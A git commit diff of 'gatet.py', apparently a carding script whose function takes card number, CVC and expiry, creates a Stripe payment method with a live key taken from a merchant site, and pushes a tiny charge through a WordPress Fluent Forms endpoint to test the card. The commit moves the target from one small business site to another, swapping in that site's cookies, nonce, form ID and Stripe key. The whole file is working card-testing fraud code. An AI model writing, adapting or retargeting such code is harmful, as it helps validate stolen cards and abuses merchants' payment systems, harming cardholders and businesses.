fa72ec7e3dc7cbdb7b92e53fe562d1af6e6cc859
Kira0621 <genpaypal01@gmail.com>
2026-03-24 17:26:20 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -29,25 +29,31 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F5412f474d5%3B+stripe-js-v3%2F5412f474d5%3B+card-element&referrer=https%3A%2F%2Ftymlierrands.com&time_on_page=48844&client_attribution_metadata[client_session_id]=d8b03559-8886-440d-b47f-45e9d42b1f9c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51QAIwdCjD5LgqSogPsNwC9Y8fApUsGHPKuoJXYABa5Um1l7YPqOIRsgJjzBgDckMiiuS8UPNwaolahqwXpGgz9QK00L4jgO4oK'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F02ed6637d5%3B+stripe-js-v3%2F02ed6637d5%3B+card-element&referrer=https%3A%2F%2Fviralikez.com&time_on_page=55942&client_attribution_metadata[client_session_id]=b99bd74c-568d-417d-b73c-7c9704d28b8b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SB2P5BUs4E0npMc93eyDvSsjeo4hrpn4aPPSNOPn7kBypc3kEmnfzUrphTijZdbdFVyqtniuaV7r7N4BI4DUklK00FXe2Rias'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	cookies = {
-	    '_ga': 'GA1.1.1378298014.1774103503',
-	    '_ga_BEWSKNQZ7P': 'GS2.1.s1774103503$o1$g1$t1774103551$j12$l0$h0',
+	    'sbjs_migrations': '1418474375998%3D1',
+	    'sbjs_current_add': 'fd%3D2026-03-24%2010%3A17%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fviralikez.com%2Fautomate-your-business%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+	    'sbjs_first_add': 'fd%3D2026-03-24%2010%3A17%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fviralikez.com%2Fautomate-your-business%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
+	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fviralikez.com%2Fautomate-your-business%2F',
+	    'fluentform_step_form_hash_3': 'bdead8ad-f20e-45dc-a79a-c11ae59a3686',
 	}
 	
 	headers = {
-	    'authority': 'tymlierrands.com',
+	    'authority': 'viralikez.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '_ga=GA1.1.1378298014.1774103503; _ga_BEWSKNQZ7P=GS2.1.s1774103503$o1$g1$t1774103551$j12$l0$h0',
-	    'origin': 'https://tymlierrands.com',
-	    'referer': 'https://tymlierrands.com/pay-test/',
+	    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-24%2010%3A17%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fviralikez.com%2Fautomate-your-business%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-03-24%2010%3A17%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fviralikez.com%2Fautomate-your-business%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fviralikez.com%2Fautomate-your-business%2F; fluentform_step_form_hash_3=bdead8ad-f20e-45dc-a79a-c11ae59a3686',
+	    'origin': 'https://viralikez.com',
+	    'referer': 'https://viralikez.com/automate-your-business/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -59,21 +65,15 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1774103559044',
+	    't': '1774347494528',
 	}
 	
 	data = {
-	    'data': f'__fluent_form_embded_post_id=2281&_fluentform_23_fluentformnonce=227388b17c&_wp_http_referer=%2Fpay-test%2F&pickup_address%5Baddress_line_1%5D=&pickup_address%5Bcity%5D=&pickup_address%5Bstate%5D=&pickup_address%5Bzip%5D=&dropoff_address%5Baddress_line_1%5D=&dropoff_address%5Bcity%5D=&dropoff_address%5Bstate%5D=&dropoff_address%5Bzip%5D=&calculated_miles=&datetime=03%2F21%2F2026&dropdown=&dropdown_2=Cartons&input_radio=no&description=&estimated_weight=&flights_of_stairs=&custom_payment_amount_1=0.50&payment_method=stripe&names%5Bfirst_name%5D=&email=&phone=&__stripe_payment_method_id={pm}',
+	    'data': f'__fluent_form_embded_post_id=1599&_fluentform_3_fluentformnonce=ae2bdf979b&_wp_http_referer=%2Fautomate-your-business%2F&business_type=coaches&coaching_total=0&others_additional_total=0&solution_subtotal2=0&selected_plan=managed&review_subtotal2=0&custom-payment-amount=0.60&payment_method=stripe&coaches_pains%5B%5D=&other_additional%5B%5D=&__stripe_payment_method_id={pm}',
 	    'action': 'fluentform_submit',
-	    'form_id': '23',
+	    'form_id': '3',
 	}
 	
-	response = requests.post(
-	    'https://tymlierrands.com/wp-admin/admin-ajax.php',
-	    params=params,
-	    cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
+	response = requests.post('https://viralikez.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
 	
 	return response.text
